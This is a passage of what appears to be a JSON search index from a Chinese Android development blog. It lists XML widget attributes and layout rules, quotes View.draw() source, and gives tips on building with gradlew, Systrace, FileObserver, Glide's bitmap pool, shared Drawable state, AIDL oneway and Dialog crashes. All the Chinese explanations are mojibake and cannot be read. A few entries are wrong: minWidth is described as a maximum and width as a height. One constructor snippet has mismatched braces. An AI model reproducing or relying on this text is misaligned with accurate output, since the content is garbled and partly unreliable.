android:transcriptModeè®¾ç½®æŠ„æœ¬æ¨¡å¼ ListViewå±æ€§è¯´æ˜ android:choiceMode é€‰æ‹©æ¨¡å¼ android:divider åˆ†å‰²çº¿é¢œè‰²æˆ–ç»„ä»¶çš„å‚è€ƒ android:dividerHeight åˆ†å‰²çº¿é«˜åº¦ android:entries æŒ‡å®šç»‘å®šåˆ°å½“å‰åˆ—è¡¨è§†å›¾çš„ä¸€ä¸ªæ•°ç»„èµ„æº android:footerDividersEnabled æ˜¯å¦å…è®¸é¡µè„šåˆ†å‰²çº¿ android:headerDividersEnabled æ˜¯å¦å…è®¸é¡µçœ‰åˆ†å‰²çº¿ GridViewå±æ€§è¯´æ˜ android:columnWidth æŒ‡å®šåˆ—å®½ android:gravity æ·»åŠ ç»„ä»¶çš„é‡å¿ƒä½ç½® android:horizontalSpacing æ°´å¹³ç©ºé—´ android:numColumns æŒ‡å®šåˆ—æ•° android:strechMode ä¼¸å±•æ¨¡å¼ android:verticalSpacing å‚ç›´ç©ºé—´ Galleryå±æ€§è¯´æ˜ android:animationDuration åŠ¨ç”»æŒç»­æ—¶é—´ android:gravity æ·»åŠ ç»„ä»¶çš„é‡å¿ƒä½ç½® android:spacing é—´éš”ç©ºé—´ android:unselectedAlpha éé€‰æ‹©æ¡ç›®çš„é€æ˜åº¦ TextViewå±æ€§è¯´æ˜ android:autoLink æ˜¯å¦è‡ªåŠ¨é“¾æ¥ï¼ˆå†…å®¹æ˜¯ç½‘å€æˆ–æ˜¯ç”µå­é‚®ä»¶æ—¶ï¼‰ android:autoText è‡ªåŠ¨æ›´æ–°æ‹¼éŸ³é”™è¯¯ android:bufferType è®¾ç½®ç¼“å†²åŒºç±»å‹ android:capitalize è‡ªåŠ¨å¤§å†™ android:cursorVisible å…‰æ ‡æ˜¯å¦å¯è§ï¼Œtrueæˆ–false android:digits æ‰€æ¥å—çš„æ•°å­—å­—ç¬¦ android:drawableBottom åœ¨æ–‡æœ¬ä¸‹æ–¹ç»˜åˆ¶ android:drawableLeft åœ¨æ–‡æœ¬å·¦æ–¹ç»˜åˆ¶ android: drawablePadding ç»˜åˆ¶å¡«å……åŒº android: drawableRight åœ¨æ–‡æœ¬å³æ–¹ç»˜åˆ¶ android: drawableTop åœ¨æ–‡æœ¬ä¸Šæ–¹ç»˜åˆ¶ android:editable æ˜¯å¦å¯ç¼–è¾‘ï¼Œtrueæˆ–false android:editorExtras è®¾ç½®æ–‡æœ¬çš„é¢å¤–çš„è¾“å…¥æ•°æ®ã€‚åœ¨EditViewä¸­æ‰æœ‰æ•ˆæœ android:ellipsize å½“å†…å®¹è¿‡é•¿æ—¶ä¼šè‡ªåŠ¨æ‰“æ–­å•è¯å†…å®¹ android:ems è®¾ç½®TextViewçš„å®½åº¦ä¸ºNä¸ªå­—ç¬¦çš„å®½åº¦ android:enabled æ˜¯å¦å¯ç”¨ï¼Œtrueæˆ–false android:freezesText æ˜¯å¦å†»ç»“æ–‡æœ¬ android:gravity æŒ‡æ˜æ–‡æœ¬çš„é‡å¿ƒä½ç½® android:height é«˜åº¦å€¼ android:hint æŒ‡ç¤ºå†…å®¹ android:imeActionId è®¾ç½®IMEåŠ¨ä½œID android:imeActionLabel è®¾ç½®IMEåŠ¨ä½œæ ‡ç­¾ android:imeOptions è¾“å…¥æ³•é€‰é¡¹ android:includeFontPadding è®¾ç½®æ–‡æœ¬æ˜¯å¦åŒ…å«é¡¶éƒ¨å’Œåº•éƒ¨é¢å¤–ç©ºç™½ï¼Œé»˜è®¤ä¸ºtrue android:inputMethod æŒ‡å®šè¾“å…¥æ³• android:inputType è¾“å…¥ç±»å‹ï¼Œå–å€¼ä¸ºä¸‹åˆ—ä¹‹ä¸€ï¼š none textæ™®é€šæ–‡æœ¬ textCapCharacterså¤§å†™å­—ç¬¦ textCapWordså•è¯é¦–å­—æ¯å¤§å†™ textCapSentenceså¥å­é¦–å­—æ¯å¤§å†™ textAutoCorretè‡ªåŠ¨æ›´æ­£ textAutoCompleteè‡ªåŠ¨å®Œæˆ textMultiLineå¤šè¡Œå†…å®¹ textUriï¼ŒUri textEmailAddressç”µå­é‚®ä»¶åœ°å€ textEmailSubjectç”µå­é‚®ä»¶ä¸»é¢˜ textShortMessageçŸ­æ¶ˆæ¯ textLongMessageé•¿æ¶ˆæ¯ textPersonNameä¸ªäººå§“å textPostalAddressé‚®æ”¿åœ°å€ textPasswordå¯†ç  textVIsiblePasswordå¯è§çš„å¯†ç  textWebEditTextç½‘é¡µæ ¼å¼ textFilterè¿‡æ»¤å­—ç¬¦ä¸² textPhoneticè¯­è¨€å‘éŸ³ numberæ•°å­— numberSignedæœ‰ç¬¦å·æ•°å­— numberDecimalåè¿›åˆ¶æ•°å­— phoneç”µè¯å·ç  datetimeæ—¥æœŸæ—¶é—´ dateæ—¥æœŸ timeæ—¶é—´ android:lineSpacingExtra è®¾ç½®è¡Œé—´è· android:lineSpacingMultiplier è®¾ç½®è¡Œé—´è·çš„å€æ•° android:lines è®¾ç½®æ–‡æœ¬è¡Œæ•° android:linksClickable è®¾ç½®é“¾æ¥æ˜¯å¦ç‚¹å‡»è¿æ¥ï¼Œå³ä½¿è®¾ç½®äº†autoLick android:marqueeRepeatLimit æ¥å›ç§»åŠ¨çš„åŠ¨ç”»æ¬¡æ•° android:maxEms è®¾ç½®TextViewçš„å®½åº¦ä¸ºæœ€é•¿ä¸ºNä¸ªå­—ç¬¦çš„å®½åº¦ã€‚ä¸emsåŒæ—¶ä½¿ç”¨æ—¶è¦†ç›–emsé€‰é¡¹ android:maxHeight ç‰©ä½“çš„æœ€å¤§é«˜åº¦ android:maxLength æœ€å¤§æ–‡æœ¬é•¿åº¦ android:maxLines æœ€å¤§è¡Œæ•° android:minWidth ç‰©ä½“çš„æœ€å¤§å®½åº¦ android:minEms è®¾ç½®TextViewçš„å®½åº¦ä¸ºæœ€çŸ­ä¸ºNä¸ªå­—ç¬¦çš„å®½åº¦ã€‚ä¸emsåŒæ—¶ä½¿ç”¨æ—¶è¦†ç›–emsé€‰é¡¹ android:minHeight ç‰©ä½“çš„æœ€å°é«˜åº¦ android:minLines æœ€å°æ–‡æœ¬è¡Œæ•° android:minWidth ç‰©ä½“çš„æœ€å°å®½åº¦ android:numeric æ˜¯å¦ä½¿ç”¨æ•°å­—è¾“å…¥æ–¹å¼ android:password æ˜¯å¦ä½¿ç”¨å¯†ç è¾“å…¥æ–¹å¼ android:phonenumber æ˜¯å¦ä½¿ç”¨ç”µè¯å·ç è¾“å…¥æ–¹å¼ android:privateImeOptions è®¾ç½®è¾“å…¥æ³•é€‰é¡¹ android:scrollHorizontally è®¾ç½®æ–‡æœ¬è¶…å‡ºTextViewçš„å®½åº¦çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¦å‡ºç°æ¨ªæ‹‰æ¡ android:selectAllOnFocus å¦‚æœæ–‡æœ¬æ˜¯å¯é€‰æ‹©çš„ï¼Œè®©ä»–è·å–ç„¦ç‚¹è€Œä¸æ˜¯å°†å…‰æ ‡ç§»åŠ¨ä¸ºæ–‡æœ¬çš„å¼€å§‹ä½ç½®æˆ–è€…æœ«å°¾ä½ç½®ã€‚TextViewä¸­è®¾ç½®åæ— æ•ˆæœã€‚ android:shadowColor æ–‡æœ¬é˜´å½±é¢œè‰² android:shadowDx é˜´å½±çš„æ°´å¹³åç§» android:shadowDy é˜´å½±çš„å‚ç›´åç§» android:shadowRadius é˜´å½±çš„åŠå¾„ android:singleLine æ˜¯å¦å•è¡Œï¼ˆä¸è‡ªåŠ¨æ¢è¡Œï¼‰ android:text æ˜¾ç¤ºçš„æ–‡æœ¬å†…å®¹ android:textApperance åŸºæœ¬å­—ä½“é¢œè‰²ã€å­—æ ·ã€å¤§å°å’Œæ ·å¼ android:textColor æ–‡æœ¬é¢œè‰² android: textColorHighlight æ–‡æœ¬é«˜äº®é¢œè‰² android: textColorHint æ–‡æœ¬æç¤ºé¢œè‰² android:textColorLink æ–‡æœ¬é“¾æ¥é¢œè‰² android:textScaleX æ–‡æœ¬ç¼©æ”¾å› æ•° android:textSize æ–‡æœ¬å¤§å° android:textStyle æ–‡æœ¬æ ·å¼ï¼Œå–å€¼ä¸ºä¸‹åˆ—ä¹‹ä¸€ï¼š boldç²—ä½“ italicæ–œä½“ bolditalicç²—æ–œä½“ android:typeface å­—æ · android:width ç‰©ä½“çš„é«˜åº¦ AutoCompleteTextViewå±æ€§è¯´æ˜ android:completionHint æ˜¾ç¤ºæç¤º android:completionHintView æç¤ºè§†å›¾ android:completionThreshold è®¾ç½®å¼€å§‹æç¤ºçš„å­—ç¬¦æ•° android:dropDownAnchor ä¸‹æ‹‰æ¡†é“¾æ¥è§†å›¾ android:dropDownSelector ä¸‹æ‹‰æ¡†é€‰æ‹©å™¨ android:dropDownWIdth ä¸‹æ‹‰æ¡†å®½åº¦ ImageViewå±æ€§è¯´æ˜ android:adjustViewBounds æ˜¯å¦è°ƒæ•´è§†å›¾èŒƒå›´ android:baselineAlignBottom æ˜¯å¦æŒ‰ç…§ä¸‹ç«¯åŸºçº¿å¯¹é½ android:cropToPadding æ˜¯å¦æŒ‰ç…§å¡«å……è¿›è¡Œè£å‰ª android:maxHeight è®¾ç½®æœ€å¤§é«˜åº¦ android:maxWidth è®¾ç½®æœ€å¤§å®½åº¦ android:scaleType ç¼©æ”¾ç±»å‹ï¼Œå–å€¼ä¸ºä¸‹åˆ—ä¹‹ä¸€ï¼š matrixå›¾ç‰‡çœŸå®å¤§å° fitXYé€‚åˆå›¾ç‰‡å¤§å° fitStart fitCenter fitEnd centerå±…ä¸­æ˜¾ç¤º centerCrop centerInside android:src è®¾ç½®ç»˜åˆ¶ç”¨å†…å®¹ android:tint è®¾ç½®æŸ“è‰²é¢œè‰²å€¼ android:layout_above=&quot;@id/xxx&quot; å°†æ§ä»¶ç½®äºç»™å®šIDæ§ä»¶ä¹‹ä¸Š android:layout_below=&quot;@id/xxx&quot; å°†æ§ä»¶ç½®äºç»™å®šIDæ§ä»¶ä¹‹ä¸‹ android:layout_toLeftOf=&quot;@id/xxx&quot; å°†æ§ä»¶çš„å³è¾¹ç¼˜å’Œç»™å®šIDæ§ä»¶çš„å·¦è¾¹ç¼˜å¯¹é½ android:layout_toRightOf=&quot;@id/xxx&quot; å°†æ§ä»¶çš„å·¦è¾¹ç¼˜å’Œç»™å®šIDæ§ä»¶çš„å³è¾¹ç¼˜å¯¹é½ android:layout_alignLeft=&quot;@id/xxx&quot; å°†æ§ä»¶çš„å·¦è¾¹ç¼˜å’Œç»™å®šIDæ§ä»¶çš„å·¦è¾¹ç¼˜å¯¹é½ android:layout_alignTop=&quot;@id/xxx&quot; å°†æ§ä»¶çš„ä¸Šè¾¹ç¼˜å’Œç»™å®šIDæ§ä»¶çš„ä¸Šè¾¹ç¼˜å¯¹é½ android:layout_alignRight=&quot;@id/xxx&quot; å°†æ§ä»¶çš„å³è¾¹ç¼˜å’Œç»™å®šIDæ§ä»¶çš„å³è¾¹ç¼˜å¯¹é½ android:layout_alignBottom=&quot;@id/xxx&quot; å°†æ§ä»¶çš„åº•è¾¹ç¼˜å’Œç»™å®šIDæ§ä»¶çš„åº•è¾¹ç¼˜å¯¹é½ android:layout_alignParentLeft=&quot;true&quot; å°†æ§ä»¶çš„å·¦è¾¹ç¼˜å’Œçˆ¶æ§ä»¶çš„å·¦è¾¹ç¼˜å¯¹é½ android:layout_alignParentTop=&quot;true&quot; å°†æ§ä»¶çš„ä¸Šè¾¹ç¼˜å’Œçˆ¶æ§ä»¶çš„ä¸Šè¾¹ç¼˜å¯¹é½ android:layout_alignParentRight=&quot;true&quot; å°†æ§ä»¶çš„å³è¾¹ç¼˜å’Œçˆ¶æ§ä»¶çš„å³è¾¹ç¼˜å¯¹é½ android:layout_alignParentBottom=&quot;true&quot; å°†æ§ä»¶çš„åº•è¾¹ç¼˜å’Œçˆ¶æ§ä»¶çš„åº•è¾¹ç¼˜å¯¹é½ android:layout_centerInParent=&quot;true&quot; å°†æ§ä»¶ç½®äºçˆ¶æ§ä»¶çš„ä¸­å¿ƒä½ç½® android:layout_centerHorizontal=&quot;true&quot; å°†æ§ä»¶ç½®äºæ°´å¹³æ–¹å‘çš„ä¸­å¿ƒä½ç½® android:layout_centerVertical=&quot;true&quot; å°†æ§ä»¶ç½®äºå‚ç›´æ–¹å‘çš„ä¸­å¿ƒä½ç½® updateView.getScrollXå’ŒgetScrollYè¿”å›çš„æ˜¯mScrollXå’ŒmScrollYã€‚è¿™ä¸ªå€¼åœ¨View.draw()æ–¹æ³•ä¸­ç”¨åˆ°äº†: if (offsetForScroll) { canvas.translate(mLeft - sx, mTop - sy); } else { if (!drawingWithRenderNode) { canvas.translate(mLeft, mTop); } if (scalingRequired) { if (drawingWithRenderNode) { // TODO: Might not need this if we put everything inside the DL restoreTo = canvas.save(); } // mAttachInfo cannot be null, otherwise scalingRequired == false final float scale = 1.0f / mAttachInfo.mApplicationScale; canvas.scale(scale, scale); } } æ‰€ä»¥åªæ˜¯ä¸€ä¸ªcanvasçš„translateç½¢äº†ã€‚ å¦å¤–ï¼Œåœ¨drawé‡Œé¢è¿˜æœ‰ä¸€æ®µç›´æ¥buildCacheçš„æ–¹æ³•.View.draw() Bitmap cache = null; int layerType = getLayerType(); // TODO: signify cache state with just &#39;cache&#39; local if (layerType == LAYER_TYPE_SOFTWARE || !drawingWithRenderNode) { if (layerType != LAYER_TYPE_NONE) { // If not drawing with RenderNode, treat HW layers as SW layerType = LAYER_TYPE_SOFTWARE; buildDrawingCache(true); } cache = getDrawingCache(true); } // çœç•¥éƒ¨åˆ† if (!drawingWithDrawingCache) { if (drawingWithRenderNode) { mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; ((DisplayListCanvas) canvas).drawRenderNode(renderNode); //èµ°RenderNode } else { // Fast path for layouts with no backgrounds if ((mPrivateFlags &amp; PFLAG_SKIP_DRAW) == PFLAG_SKIP_DRAW) { mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; dispatchDraw(canvas); } else { draw(canvas); } } } else if (cache != null) { // ç›´æ¥æ‹¿bitmapcacheå» mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; if (layerType == LAYER_TYPE_NONE || mLayerPaint == null) { // no layer paint, use temporary paint to draw bitmap // ............. canvas.drawBitmap(cache, 0.0f, 0.0f, cachePaint); } else { // use layer paint to draw the bitmap, merging the two alphas, but also restore canvas.drawBitmap(cache, 0.0f, 0.0f, mLayerPaint); // ........ } }","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"ä½¿ç”¨IDEå†…ç½®çš„Terminal","date":"2017-03-11T22:28:51.000Z","path":"2017/03/11/2017-03-11-utilizing-the-terminal-in-android-studio/","text":"è¿™å‘¨ç»ˆäºæŠŠGoogle I/O 2016çš„Android Appåœ¨Deviceä¸Šè·‘èµ·æ¥äº†ï¼Œé¡ºä¾¿å°è¯•å¤šå¤šä½¿ç”¨å‘½ä»¤è¡Œè¿›è¡Œç¼–è¯‘æˆ–è€…å®‰è£…ã€‚ 1. ç¼–è¯‘Android clientå¹¶å®‰è£…åˆ°æœ¬åœ°è®¾å¤‡å®˜æ–¹æä¾›äº†æ¯”è¾ƒå®Œå–„çš„Build Instructionsï¼Œå¯¹äºä¹ æƒ¯äºshift+F10çš„æˆ‘æ¥è¯´ï¼Œè¿˜æ˜¯æœ‰ç‚¹éº»çƒ¦ã€‚ cloneä¸‹æ¥ioschedï¼Œä¿®æ”¹gradle.properitiesé‡Œé¢çš„supportLibç­‰å€¼ï¼Œå‚è€ƒBuild Instruction ï¼Œ gradlew clean assembleDebug å¾€å¾€è¿™ä¸€æ­¥ä¼šå¼€å§‹ä¸‹è½½gradleï¼Œéå¸¸è€—æ—¶ã€‚å‚è€ƒäº†stackOverFlowï¼Œè‡ªå·±å»ä¸‹è½½gradle 3.3 -all.zipï¼Œæ”¾åˆ°/gradle/wrapperæ–‡ä»¶å¤¹ä¸‹ï¼Œä¿®æ”¹gradle-wrapper.properitiesï¼Œå°†å…¶ä¸­çš„distributionUrlæ”¹æˆ distributionUrl=gradle-3.3-all.zip ç­‰äºç›´æ¥çœå»ä¸Šè¿°ä¸‹è½½æ­¥éª¤ã€‚Buildå®Œæˆåï¼Œæ•²å…¥å‘½ä»¤è¡Œ gradlew installNormalDebug ä¸å‡ºæ„å¤–çš„è¯ï¼Œå³å¯è¿›å…¥ä¸»é¡µé¢ã€‚ 2. Serverç«¯é…ç½®Google io 2016 Android Clientæä¾›äº†Map Intergationå’ŒYoutube video displayä»¥åŠGCMç­‰æœåŠ¡ã€‚è¿™äº›å…¨éƒ¨é›†æˆåœ¨Google Cloud Platformä¸Šé…ç½®ã€‚ å…³äºæ€§èƒ½ä¼˜åŒ–æœ‰ä¸€äº›å»ºè®®ï¼š donâ€™t do premature optimazitionåœ¨ä½ æ•´å¤©æ€è€ƒåˆ°åº•è¦ç”¨Enumè¿˜æ˜¯IntDefçš„æ—¶å€™ï¼Œä½ çš„ç½‘ç»œåº“å·²ç»allocateäº†ä¸€å¤§å †çš„åƒåœ¾ã€‚å°†ç²¾åŠ›é›†ä¸­åœ¨è§£å†³æœ€ä¸¥é‡çš„é—®é¢˜ä¸Šã€‚ï¼Œ 1. Systraceç”¨äºè·Ÿè¸ªä¸€æ®µæ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­çš„å½±å“try { Trace.beginSection(TAG); // do stuff }finally { Trace.endSection(); } è®¡ç®—ä¸€æ®µæ–¹æ³•åˆ°åº•èŠ±äº†å¤šé•¿æ—¶é—´ï¼Œå½“ç„¶è¿˜æ˜¯è¦åœ¨Android device monitoré‡Œé¢begin traceï¼Œæ³¨æ„è¦å‹¾é€‰Enable Application Traces from XXXXï¼Œé€‰ä¸­è‡ªå·±çš„åŒ…åå°±å¥½äº†ã€‚ä¸€å¼€å§‹å¯èƒ½ä¸æ˜¯ç‰¹åˆ«å¥½æ‰¾ï¼Œåªè¦åœ¨htmlä¸­ctrl+fæ‰¾åˆ°äº†è‡ªå·±å†™çš„TAGï¼Œæ…¢æ…¢æ¥åº”è¯¥èƒ½æ‰¾åˆ°çš„ã€‚ 2. FileObserverFileObserverå¯ä»¥ç›‘æ§è®¾å¤‡ä¸Šæ–‡ä»¶çš„æ›´æ”¹ï¼Œåˆ é™¤ï¼Œè¯»å–ã€‚åº•å±‚åŸç†æ˜¯ä½¿ç”¨äº†linuxå†…æ ¸çš„inotifyæœºåˆ¶ã€‚ä½†ç®€ä¹¦ä¸Šæœ‰äººè¯´ android fileobserver å¯ä»¥å¯¹æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶å¤¹è¿›è¡Œç›‘å¬ï¼Œä½†ä¸èƒ½ç›‘å¬å­ç›®å½•ã€‚è¦ç›‘å¬å­ç›®å½•å¿…é¡»é€’å½’éå†æ‰€æœ‰çš„æ–‡ä»¶å¤¹å¯¹å…¶æ·»åŠ ç›‘å¬ã€‚fileobserver åœ¨ Android 4.0 å’Œ 5.0 ä¸­æ˜¯å¥½ç”¨çš„ï¼Œä½†åœ¨ Android 6.0 ä¸­æœ‰ bug ç›‘å¬ä¸èƒ½å·¥ä½œã€‚ 3. Environment.getXXXé•¿ä»€ä¹ˆæ ·ç§æœ‰æ–‡ä»¶åº”è¯¥æ”¾åœ¨å“ªé‡Œï¼Œå…¬å¼€çš„æ–‡ä»¶é€‚åˆæ”¾åœ¨å“ªé‡Œï¼Œtmpæ–‡ä»¶å¯ä»¥æ”¾åœ¨å“ªé‡Œã€‚ Log.i(&quot;codecraeer&quot;, &quot;getFilesDir = &quot; + getFilesDir()); Log.i(&quot;codecraeer&quot;, &quot;getExternalFilesDir = &quot; + getExternalFilesDir(&quot;exter_test&quot;).getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getDownloadCacheDirectory = &quot; + Environment.getDownloadCacheDirectory().getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getDataDirectory = &quot; + Environment.getDataDirectory().getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getExternalStorageDirectory = &quot; + Environment.getExternalStorageDirectory().getAbsolutePath()); Log.i(&quot;codecraeer&quot;, &quot;getExternalStoragePublicDirectory = &quot; + Environment.getExternalStoragePublicDirectory(&quot;pub_test&quot;)); 4.å¯¹è±¡æ± (Object Pool)è¿™ä¸ªçœ‹ä¸€ä¸‹Glideé‡Œé¢çš„BitmapPoolå°±å¥½äº†LruBitmapPool.javapoolçš„å¤§å°æ˜¯MemorySizeCalculatorç®—å‡ºæ¥çš„ï¼Œè€ƒè™‘äº†Appå¯ä»¥ä½¿ç”¨çš„æœ€å¤§å†…å­˜å’Œå±å¹•åˆ†è¾¨ç‡åƒç´ å¯¹åº”å®¹é‡è¿™ä¸¤ä¸ªå› ç´ ã€‚å¯¹è±¡æ± ä¸»è¦å…³æ³¨putå’Œgetè¿™ä¸¤ä¸ªæ–¹æ³•ã€‚Glideä¸­çš„LruBitmapPool.javaä¸­æœ‰ä¸€æ®µå¾ˆæœ‰æ„æ€çš„æ³¨é‡Š @Override public synchronized Bitmap get(int width, int height, Bitmap.Config config) { Bitmap result = getDirty(width, height, config); if (result != null) { // Bitmaps in the pool contain random data that in some cases must be cleared for an image to be rendered // correctly. we shouldn&#39;t force all consumers to independently erase the contents individually, so we do so // here. See issue #131. result.eraseColor(Color.TRANSPARENT); } return result; } å°±æ˜¯è¯´ï¼Œä»å›æ”¶æ± é‡Œé¢å–å‡ºæ¥çš„Bitmapå¯èƒ½å­˜å‚¨äº†ä¸€äº›è„æ•°æ®ï¼Œåœ¨å¤ç”¨ä¹‹å‰è¦æ¸…é™¤ä¸‹æ—§æ•°æ®ã€‚ å¦å¤–ï¼ŒMotionEvent,Message,VelocityTrackerä»¥åŠOkioé‡Œé¢çš„Segmentéƒ½æ˜¯å¯ä»¥è¢«recycleå’Œobtainçš„å¯å›æ”¶å†åˆ©ç”¨å¯¹è±¡ã€‚Andorid BitmapåæœŸæ”¯æŒäº†inBitmapï¼Œä¹Ÿæ˜¯ç±»ä¼¼äºå›æ”¶å†åˆ©ç”¨çš„æ¦‚å¿µã€‚Bitmapæœ‰ç‚¹ä¸åŒï¼Œè™½ç„¶å†…å­˜ä¸­çš„è¡¨ç°å½¢å¼åªæ˜¯äºŒç»´byteæ•°ç»„ã€‚ä½†åœ¨æ”¯æŒinBitmapä¹‹å‰ï¼Œå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªBitmapéƒ½å¯ä»¥è¢«ç›´æ¥å›æ”¶ç”¨äºå­˜å‚¨ä¸‹ä¸€ä¸ªBitmap. V4åŒ…é‡Œæä¾›äº†ç®€å•çš„å®ç° 5.MediaScanneræ˜¯ä¸€ä¸ªå’Œæœ‰è¶£çš„å¯ä»¥æ‰«æå¤šåª’ä½“æ–‡ä»¶çš„ç±»æŠ€æœ¯å°é»‘å±‹ 6. Drawableè·Ÿå•ä¾‹æœ‰ç‚¹åƒå®˜æ–¹æ–‡æ¡£ä¸Šæœ‰è¿™ä¹ˆä¸€å¥ï¼Œçœ‹èµ·æ¥å¾ˆä¸èµ·çœ¼çš„Note: Each unique resource in your project can maintain only one state, no matter how many different objects you instantiate for it. For example, if you instantiate two Drawable objects from the same image resource and change a property (such as the alpha) for one object, then it also affects the other. When dealing with multiple instances of an image resource, instead of directly transforming the Drawable object you should perform a tween animation.è¿™ä»¶äº‹çš„æ„ä¹‰åœ¨äºï¼ŒDrawableåœ¨æ•´ä¸ªApplicationä¸­æ˜¯å•ä¾‹ã€‚ç®€å•æ¥è¯´ï¼ŒgetDrawableæ¯æ¬¡è¿”å›çš„éƒ½æ˜¯ä¸€ä¸ªæ–°çš„Drawableï¼Œä½†Drawableåªæ˜¯ä¸€ä¸ªWrapperï¼Œæ”¾åœ¨resæ–‡ä»¶å¤¹é‡Œçš„Drawableèµ„æºåœ¨æ•´ä¸ªApplicationä¸­æ˜¯å•ä¾‹ã€‚è¯æ˜çš„æ–¹å¼å¾ˆç®€å•: ä¸¤ä¸ªç›¸åŒèµ„æºçš„Drawableå¯èƒ½ä¸ä¸€æ ·ï¼Œä½†Drawable.getConstantStateéƒ½æ˜¯åŒä¸€ä¸ªinstanceã€‚åŸç†çš„è¯ï¼Œå‚è€ƒ Cyril Mottieråœ¨2013å¹´çš„æ¼”è®²å°±è·Ÿxmlæ˜¯binary optimizedçš„ä¸€æ ·ï¼Œäº²æµ‹ï¼Œåœ¨ä¸€ä¸ªActivityä¸­æ”¹å˜Drawableçš„Alphaå±æ€§ï¼Œé€€å‡ºé‡æ–°è¿›ï¼ŒDrawableçš„Alphaå°±å·²ç»æ˜¯è¢«æ›´æ”¹äº†çš„ã€‚åœ¨å¦ä¸€ä¸ªActivityä¸­å¼•ç”¨è¿™ä¸ªDrawableï¼ŒAlphaä¹Ÿå—åˆ°å½±å“ã€‚æ›´ä¸¥é‡çš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªActivityä¸­ä½¿ç”¨((BitmapDrawable)getDrawable).getBitmap().recycle()ï¼Œåœ¨å¦ä¸€ä¸ªActivityä¸­ä½¿ç”¨è¿™ä¸ªDrawableï¼Œç›´æ¥æŠ¥é”™ï¼š java.lang.RuntimeException: Canvas: trying to use a recycled bitmap android.graphics.Bitmap@c08bbc6 at android.graphics.Canvas.throwIfCannotDraw(Canvas.java:1270) at android.graphics.Canvas.drawBitmap(Canvas.java:1404) at android.graphics.drawable.BitmapDrawable.draw(BitmapDrawable.java:544) at android.widget.ImageView.onDraw(ImageView.java:1228) è¿™ç§ä¸œè¥¿æ ¹æœ¬é˜²ä¸èƒœé˜²ã€‚stackOverFlowä¸Šä¹Ÿæœ‰è®¨è®ºè¢«äººä¸ºè°ƒç”¨Bitmap.recycle()çš„resä¸­çš„å›¾ç‰‡èµ„æºç›´æ¥ä¸èƒ½ç”¨äº†ï¼Œæ€ä¹ˆåŠï¼Œé‡æ–°ç”¨BitmapFactoryå»decodeæˆ–è€…åˆ›å»ºä¸€å¼ Canvasï¼Œç”¨åŸæ¥çš„bitmapå»ç”»å‘—ã€‚ç…§è¯´Android 3.0ä¹‹åå°±ä¸åº”è¯¥è°ƒç”¨Recycleæ–¹æ³•äº†ï¼Œè®°å¾—Chet Haaseè¯´è¿‡ï¼ŒRecycle doesnâ€™t do anythingã€‚å¦å¤–ä¸€ç§è¯´æ³•æ˜¯ï¼Œbitmap.isMutable()è¿”å›æ˜¯falseçš„è¯(ä»resåŠ è½½çš„)å°±ä¸è¯¥å»mutateã€‚çœŸè¦æ›´æ”¹åƒç´ å±æ€§çš„è¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªCanvasï¼Œç„¶åç”¨åŸæ¥çš„bitmapå»ç”»ä¸€ä¸ªä¸€æ ·å¤§çš„ï¼Œæˆ–è€…ç”¨bitmap.copyæ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„ã€‚ 7. Aidlé‡Œé¢æœ‰äº›å…³é”®å­—onewayå…³é”®å­—ã€‚AIDL æ¥å£çš„å®ç°å¿…é¡»æ˜¯å®Œå…¨çº¿ç¨‹å®‰å…¨å®ç°ã€‚ oneway å…³é”®å­—ç”¨äºä¿®æ”¹è¿œç¨‹è°ƒç”¨çš„è¡Œä¸ºã€‚ä½¿ç”¨è¯¥å…³é”®å­—æ—¶ï¼Œè¿œç¨‹è°ƒç”¨ä¸ä¼šé˜»å¡ï¼›å®ƒåªæ˜¯å‘é€äº‹åŠ¡æ•°æ®å¹¶ç«‹å³è¿”å› 8. è‡ªå®šä¹‰Viewä¸€ä¸ªä¸å®¹æ˜“å‘ç°çš„ç‚¹è‡ªå®šä¹‰Viewçš„å¥—è·¯ä¸€èˆ¬æ˜¯è¿™æ ·çš„ public CustomTitleView(Context context, AttributeSet attrs) { { this(context, attrs, 0); } public CustomTitleView(Context context) { this(context, null); } public CustomTitleView(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); // è·å¾—æˆ‘ä»¬æ‰€å®šä¹‰çš„è‡ªå®šä¹‰æ ·å¼å±æ€§ init(); } } ç„¶ååœ¨layouté‡Œé¢å»findViewByIdï¼Œå¦¥å¦¥çš„æ‰¾ä¸åˆ°ã€‚å†™åœ¨xmlé‡Œé¢ï¼Œä¼šè°ƒåˆ°ä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°ï¼Œå› ä¸ºidè¿™ç§ä¸œè¥¿å†™æ˜¯åœ¨xmlé‡Œé¢çš„ï¼Œæ‰€ä»¥åœ¨ä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°é‡Œé¢åšäº‹æƒ…å°±å¥½äº†ã€‚ 9. Dialogä¼šå‡ºçš„ä¸€äº›é”™è¯¯9.1. showDialogä¹‹å‰æœ€å¥½åˆ¤æ–­ä¸‹,activity.isFinishingå¦åˆ™ä¼šå´©æˆè¿™æ ·ï¼š E/AndroidRuntime: FATAL EXCEPTION: main Process: com.xxx.xxx, PID: 30025 android.view.WindowManager$BadTokenException: Unable to add window -- token android.os.BinderProxy@59d55fe is not valid; is your activity running? at android.view.ViewRootImpl.setView(ViewRootImpl.java:579) at android.view.WindowManagerGlobal.addView(WindowManagerGlobal.java:310) at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:91) at android.app.Dialog.show(Dialog.java:319) ... 9.2. 